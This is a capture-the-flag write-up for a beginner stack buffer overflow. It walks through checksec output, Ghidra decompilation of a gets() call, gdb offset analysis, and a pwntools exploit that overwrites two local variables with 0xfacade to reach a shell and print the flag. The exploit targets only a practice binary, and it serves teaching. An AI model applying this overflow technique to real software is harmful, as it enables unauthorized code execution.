# &#35; chall_00

#### &#42; purpose
1. this level just try to stack overflow.
2. need to are overwritten with (local_c = 0xfacade) and (local_10 = 0xfacade) 


#### &#42; execute
```bash
## 1 file
$ $ ls chall_00
chall_00

## 64-bit LSB, dynamically linked and not stripped
$ file ./chall_00
./chall_00: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ae90428f1b078a49d5f355f10565a45fee5f6ca8, for GNU/Linux 3.2.0, not stripped

## Full RELRO and PIE enabled
$ checksec --file=./chall_00
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   67) Symbols	  No	0		1		./chall_00

## just input once
$ ./chall_00
This is the only one
AAAAAAAA
$

```

#### &#42; decompile using ghidra
```bash
## need to match values(0xfacade)
void main(void)

{
  char local_48 [56];
  int local_10;
  int local_c;
  
  puts("This is the only one");
  gets(local_48);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}

```

#### &#42; structure of stack
```bash
buf[56] + local_10[4] + local_c[4]


```

#### &#42; payload(python)
```python
payload  = b"A"*56
payload += p64(0xfacade)
payload += p64(0xfacade)

```

#### &#42; analysis binary using gdb
```bash
gef➤  x/s 0x00007ffc22642370
0x7ffc22642370:	'B' <repeats 56 times>, "CCCCDDDD"
gef➤ 

gef➤  x/16xg $rbp-0x8
0x7ffc226423a8:	0x4444444443434343	0x0000000000000000
0x7ffc226423b8:	0x00007fb54f7a70b3	0x00007fb54f9ac620
0x7ffc226423c8:	0x00007ffc226424a8	0x0000000100000000
0x7ffc226423d8:	0x00005575bf7ba189	0x00005575bf7ba1e0
0x7ffc226423e8:	0x586fc3a255bafb53	0x00005575bf7ba0a0
0x7ffc226423f8:	0x00007ffc226424a0	0x0000000000000000
0x7ffc22642408:	0x0000000000000000	0xa797876a123afb53
0x7ffc22642418:	0xa7055d56b574fb53	0x0000000000000000
gef➤

gef➤  p/d 0x7ffc226423a8-0x7ffc22642370
$1 = 56
gef➤

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_00'
conn = process(filename)

print( conn.recvuntil("This is the only one\n") )

payload  = b"A"*56
payload += p64(0xfacade)
payload += p64(0xfacade)


conn.send(payload)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_00' in $PATH, using './chall_00' instead
[+] Starting local process './chall_00': pid 2452
This is the only one

[*] Switching to interactive mode
$
$ cat flag.txt
sun{burn-it-down-6208bbc96c9ffce4}
$

```
